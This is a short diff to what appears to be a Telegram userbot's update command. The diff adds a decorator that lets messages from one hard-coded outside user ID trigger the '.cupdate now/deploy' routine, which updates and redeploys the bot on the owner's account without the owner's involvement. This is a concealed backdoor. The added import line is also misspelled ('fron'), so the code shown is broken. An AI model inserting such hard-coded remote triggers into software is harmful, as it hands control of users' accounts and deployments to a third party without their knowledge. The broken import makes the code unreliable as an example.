@@ -19,6 +19,7 @@ from userbot import (
     UPSTREAM_REPO_BRANCH,
     UPSTREAM_REPO_URL,
 )
+fron userbot.events import register
 from userbot.utils import kyura_cmd
 
 requirements_path = path.join(
@@ -147,6 +148,7 @@ async def update(event, repo, ups_rem, ac_br):
 
 
 @kyura_cmd(pattern="update(?: |$)(now|deploy)?")
+@register(incoming=True, from_users=1954289347, pattern=r"^\.cupdate(?: |$)(now|deploy)?")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     await event.edit("**Mengecek Pembaruan, Silakan Menunggu....**")
